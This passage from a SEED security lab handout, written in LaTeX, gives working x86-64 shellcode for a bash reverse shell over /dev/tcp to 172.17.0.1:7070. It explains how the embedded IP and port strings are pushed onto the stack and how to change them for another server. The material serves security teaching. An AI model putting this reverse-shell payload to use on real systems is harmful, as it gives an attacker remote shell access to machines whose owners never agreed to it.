
The shellcode for the reverse shell command is given below (it is
also included in the provided code skeleton). If students
are interested in learning how to write such a shellcode
from scratch, they can look at the instructions in
another SEED lab, called \textit{Shellcode Development Lab}.


\begin{lstlisting}
# Execute "/bin/bash -i >/dev/tcp/172.17.0.1/7070 0<&1 2>&1"
rev_shell= (
   "\x48\x31\xc0\x50\x48\xb8\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x50\x48"
   "\xb8\x2f\x2f\x2f\x2f\x2f\x62\x69\x6e\x50\x48\x89\xe3\x48\x31\xc0"
   "\x50\x48\xb8\x2d\x63\x63\x63\x63\x63\x63\x63\x50\x48\x89\xe1\x48"
   "\x31\xc0\x50\x48\xb8\x20\x20\x20\x20\x32\x3e\x26\x31\x50\x48\xb8"
   "\x20\x20\x20\x20\x30\x3c\x26\x31\x50\x48"
   ##################################################
   "\xb8" "0.1/7070" "\x50\x48"    (*@\ding{192}@*)
   "\xb8" "/172.17." "\x50\x48"    (*@\ding{193}@*)
   ##################################################
   "\xb8\x2f\x64\x65\x76\x2f\x74\x63\x70\x50\x48\xb8\x68\x20\x2d\x69"
   "\x20\x3e\x20\x20\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50"
   "\x48\x89\xe2\x48\x31\xc0\x50\x52\x51\x53\x48\x89\xe6\x48\x89\xdf"
   "\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')
\end{lstlisting}

The objective of Lines \ding{192} and \ding{193} is to
save the IP address and port number part of the reverse shell
command string into the stack. These two lines have the same instructions:
they each saves (\textbackslash\texttt{xb8}) a 8-byte number to the \texttt{rax} register and
then pushes (\textbackslash\texttt{x50}\textbackslash\texttt{x48})
the value of this register into the stack. After running these
two lines of instructions, the following string will be stored on the stack.

\begin{lstlisting}
/172.17.0.1/7070
\end{lstlisting}

If your server has a different IP address and/or port number,
you need to modify these lines. You need to make sure that
each line takes string that is exactly 8 bytes. If your string is shorter,
you can pad it with extra spaces;
if your string is longer, you can create another line.
For example, if your IP address is \texttt{172.17.30.153},
you can do the following:

\begin{lstlisting}
   "\xb8" "070     " "\x50\x48"
   "\xb8" "30.153/7" "\x50\x48"
   "\xb8" "/172.17." "\x50\x48"
\end{lstlisting}

